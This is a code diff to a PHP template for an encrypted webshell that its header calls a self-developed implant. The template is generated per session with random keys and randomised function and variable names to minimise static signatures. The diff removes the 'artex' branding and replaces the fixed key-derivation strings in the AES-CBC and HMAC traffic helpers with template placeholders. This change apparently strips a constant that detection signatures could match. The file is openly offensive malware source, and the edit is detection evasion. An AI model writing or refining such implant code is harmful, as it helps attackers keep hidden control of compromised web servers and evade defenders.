@@ -1,6 +1,6 @@
 <?php
 /**
- * ARTEX 加密马 (phpenc) —— 自研 implant,配套驱动:session/http_shell_enc.go。
+ * 加密马 (phpenc) —— 自研 implant。
  * 本文件由 generate_webshell 生成:密钥每会话独立随机,函数/变量名每份随机化
  * (静态特征最小化)。保留本文件可读性与注释,是刻意为之:交给用户审计。
  *
@@ -37,9 +37,9 @@ function {{.FDec}}($k, $m, $b64) {
     $iv  = substr($raw, 0, 16);
     $mac = substr($raw, -32);
     $ct  = substr($raw, 16, -32);
-    $km  = hash('sha256', $k . 'artex-mac-v1', true);
+    $km  = hash('sha256', $k . '{{.DMac}}', true);
     if (!hash_equals($mac, hash_hmac('sha256', $iv . $ct, $km, true))) { return false; }
-    $ke = hash('sha256', $k . 'artex-enc-v1', true);
+    $ke = hash('sha256', $k . '{{.DEnc}}', true);
     $pt = openssl_decrypt($ct, 'aes-256-cbc', $ke, OPENSSL_RAW_DATA, $iv);
     return $pt === false ? false : $pt;
 }
@@ -53,9 +53,9 @@ function {{.FEnc}}($k, $m, $pt) {
         return base64_encode($iv . $ct . $tag);
     }
     $iv  = random_bytes(16);
-    $ke  = hash('sha256', $k . 'artex-enc-v1', true);
+    $ke  = hash('sha256', $k . '{{.DEnc}}', true);
     $ct  = openssl_encrypt($pt, 'aes-256-cbc', $ke, OPENSSL_RAW_DATA, $iv);
-    $km  = hash('sha256', $k . 'artex-mac-v1', true);
+    $km  = hash('sha256', $k . '{{.DMac}}', true);
     $mac = hash_hmac('sha256', $iv . $ct, $km, true);
     return base64_encode($iv . $ct . $mac);
 }
